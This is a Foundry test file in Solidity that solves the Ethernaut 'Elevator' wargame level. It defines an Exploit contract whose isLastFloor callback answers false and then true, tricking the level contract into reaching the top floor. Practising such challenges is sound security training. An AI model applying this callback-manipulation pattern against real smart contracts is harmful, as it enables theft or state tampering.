// SPDX-License-Identifier: MIT

pragma solidity ^0.8.18;

import {console, Test} from "forge-std/Test.sol";
import {Elevator, Building} from "../../src/11/Elevator.sol";
import {HelperConfig} from "../../script/HelperConfig.s.sol";
import {ElevatorFactory} from "src/11/ElevatorFactory.sol";
import {Ethernaut} from "src/Ethernaut.sol";
import {BaseTest} from "../BaseTest.sol";
import {Vm} from "forge-std/Vm.sol";

contract ElevatorTest is Test, BaseTest {
    Elevator public instanceContract;

    constructor() {
        // SETUP LEVEL FACTORY
        bytes memory bytecode = abi.encodePacked(vm.getCode("ElevatorFactory.sol"));
        assembly {
            sstore(levelFactory.slot, create(0, add(bytecode, 0x20), mload(bytecode)))
        }
        // levelFactory = address(new ReentranceFactory());
        vm.deal(owner, 1 ether);
        vm.deal(player, 2 ether);
    }

    function setUp() public override {
        super.setUp();

        instanceContract = Elevator(instance);
    }

    function testTopIsNotReached() public view {
        assert(instanceContract.top() == false);
    }

    function testRunLevel() public {
        runLevel();
    }

    function exploitLevel() internal override {
        vm.startPrank(player);

        uint256 randomNumber = 5;

        Exploit exploit = new Exploit(instanceContract);
        exploit.callGoToFromElevator(randomNumber);

        assert(instanceContract.top() == true);

        vm.stopPrank();
    }
}

contract Exploit is Building {
    Elevator elevator;
    bool called;

    constructor(Elevator _elevator) {
        elevator = _elevator;
    }

    function isLastFloor(uint256) external returns (bool) {
        if (!called) {
            called = true;
            return false;
        }
        return true;
    }

    function callGoToFromElevator(uint256 _randomNumber) external {
        elevator.goTo(_randomNumber);
    }
}
